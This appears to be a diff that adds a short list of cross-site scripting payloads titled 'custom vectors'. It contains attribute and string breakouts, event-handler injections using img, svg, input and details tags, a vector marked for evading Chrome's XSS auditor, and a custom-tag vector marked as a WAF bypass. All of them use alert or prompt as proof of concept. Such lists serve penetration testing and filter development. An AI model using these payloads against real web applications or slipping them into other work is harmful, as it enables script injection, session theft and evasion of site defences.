@@ -1,0 +1,39 @@
+CUSTOM VECTORS
+
+"><img src=x onerror=prompt(1);>
+
++123'];alert(1);[['
+
+123',alert(1),'
+
+123\",term:alert(1)//\"
+
+123";alert`1`;//
+
+123'';!--"<XSS>=&{()}
+
+<script>alert(1)</script>
+
+')"+onMouseOver=alert(1)+onx=(
+
+// chrome xss auditor evasion
+<img src= ?itworksonchrome? onerror = alert(1);'???'>
+
+"><img src="x:x" onerror=alert('xss')>
+
+"><svg+onload=prompt`xss`+>
+
+"><input onfocus=alert('xss') autofocus><"
+
+<details ontoggle=alert`xss`><summary>Click me to demonstrate the XSS</summary></details>
+
+<svgonload=alert(1)>
+
+<svg+onload=alert(1)>
+
+<img src=x onerror=alert(1)>
+
+<img+src=x+onerror=alert`1`>
+
+<!-- waf bypass by using a custom html tag -->
+<whatever/onpointerover='var a=alert;a(1)'>
